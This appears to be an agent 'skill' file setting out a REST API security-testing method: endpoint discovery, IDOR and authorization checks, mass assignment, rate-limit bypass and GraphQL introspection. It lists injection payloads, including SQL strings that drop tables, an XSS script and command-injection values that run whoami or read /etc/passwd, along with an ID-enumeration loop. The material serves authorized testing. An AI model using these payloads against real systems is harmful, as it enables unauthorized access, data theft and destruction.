---
name: API Security Testing
category: api-security
version: "1.0"
author: "DeepHunt"
description: "REST API security testing methodology and common vulnerabilities"
tags:
  - api
  - rest
  - security-testing
  - authorization
---

# API Security Testing

## Overview

APIs are the primary attack surface for modern applications. This skill covers comprehensive API security testing.

## API Reconnaissance

### 1. Endpoint Discovery

```bash
# Swagger/OpenAPI discovery
https://target.com/api-docs
https://target.com/swagger
https://target.com/api/v1/swagger.json
https://target.com/openapi.json

# Common API paths
/api/v1/
/api/v2/
/api/
/rest/
/graphql
/v1/api
/api/v1/users
```

### 2. Method Enumeration

```bash
# Test all HTTP methods
curl -X OPTIONS https://api.target.com/endpoint

# Common methods
GET     # Read
POST    # Create
PUT     # Update (full)
PATCH   # Update (partial)
DELETE  # Remove
HEAD    # Headers only
OPTIONS # Allowed methods
```

### 3. Header Analysis

```bash
# Check security headers
curl -I https://api.target.com/

# Look for:
# - X-Api-Key
# - Authorization: Bearer
# - X-Auth-Token
# - X-Request-ID
```

## IDOR (Insecure Direct Object Reference)

### Testing for IDOR

```bash
# Replace IDs in request
curl -X GET "https://api.target.com/users/123" \
  -H "Authorization: Bearer TOKEN"

# Try different ID formats
curl -X GET "https://api.target.com/users/abc123"
curl -X GET "https://api.target.com/users/1 OR 1=1"
curl -X GET "https://api.target.com/users/%7B%22id%22%3A123%7D"
```

### Batch IDOR Testing

```bash
# Test multiple IDs
for id in {1..100}; do
  status=$(curl -s -o /dev/null -w "%{http_code}" \
    "https://api.target.com/users/$id")
  if [ "$status" = "200" ]; then
    echo "Accessible: $id"
  fi
done
```

## Mass Assignment

### Test for Mass Assignment

```bash
# Try to set additional fields
curl -X POST "https://api.target.com/users" \
  -H "Content-Type: application/json" \
  -d '{
    "username": "test",
    "password": "Test123!",
    "role": "admin"
  }'

# Try hidden fields
curl -X POST "https://api.target.com/users" \
  -d "username=test&password=Test123!&is_admin=1"
```

## Rate Limiting Testing

```bash
# Test rate limits
for i in {1..100}; do
  curl -s "https://api.target.com/endpoint" > /dev/null
done

# Check for bypass
curl -H "X-Forwarded-For: 1.2.3.4" ...

# Test with different IPs
for ip in 1.2.3.4 5.6.7.8 9.10.11.12; do
  curl -H "X-Forwarded-For: $ip" ...
done
```

## BOLA/BFLA Testing

### Broken Object Level Authorization

```bash
# User A's resource
curl "https://api.target.com/orders/12345" \
  -H "Authorization: Bearer USER_A_TOKEN"
# Returns: {"order_id": "12345", "total": "$100"}

# User B trying to access
curl "https://api.target.com/orders/12345" \
  -H "Authorization: Bearer USER_B_TOKEN"
# Should return 403, but may return data = BOLA
```

### Broken Function Level Authorization

```bash
# Regular user trying admin endpoint
curl -X DELETE "https://api.target.com/admin/users/123" \
  -H "Authorization: Bearer USER_TOKEN"

# Should return 403, but may succeed = BFLA
```

## Parameter Pollution

```bash
# Test duplicate parameters
curl "https://api.target.com/search?q=test&q=admin"

# Test array parameters
curl "https://api.target.com/users?id[]=1&id[]=2&id[]=3"

# Test type coercion
curl "https://api.target.com/users/123"     # Integer
curl "https://api.target.com/users/123abc"  # String
```

## API Fuzzing Checklist

### Headers
```bash
# Test custom headers
X-Api-Version: 1.0
X-Request-ID: random-uuid
X-Forwarded-Proto: https
X-HTTP-Method-Override: DELETE

# Test injection in headers
X-Api-Key: "' OR '1'='1"
```

### Body Parameters
```bash
# Test SQL injection
{"id": "1 OR 1=1"}
{"id": "1; DROP TABLE users--"}
{"name": "'><script>alert(1)</script>"}

# Test command injection
{"host": "localhost; whoami"}
{"file": "test.txt; cat /etc/passwd"}
```

### Authentication Testing
```bash
# Test weak tokens
curl -H "Authorization: Basic YWRtaW46YWRtaW4="
curl -H "Authorization: Bearer invalid_token"

# Test token manipulation
curl -H "Authorization: Bearer eyJ..." # Change exp/iat
```

## GraphQL Specific

```bash
# Introspection
curl -X POST https://api.target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name}}}"}'

# Batch query for data extraction
query = '{"query":"{u1:user(id:1){name} u2:user(id:2){name} u3:user(id:3){name}}"}'

# Mutations
mutation {
  createUser(input: {name: "attacker", email: "attacker@test.com"}) {
    id
  }
}
```

## API Security Checklist

### Authorization
- [ ] Test IDOR on all endpoints
- [ ] Test horizontal privilege escalation
- [ ] Test vertical privilege escalation
- [ ] Test rate limiting bypass
- [ ] Test API key reuse across users

### Authentication
- [ ] Test token generation
- [ ] Test token expiration
- [ ] Test token revocation
- [ ] Test credential stuffing protection

### Input Validation
- [ ] Test injection attacks
- [ ] Test mass assignment
- [ ] Test parameter pollution
- [ ] Test content-type validation

### Configuration
- [ ] Check for verbose errors
- [ ] Check for information disclosure
- [ ] Test CORS configuration
- [ ] Verify SSL/TLS settings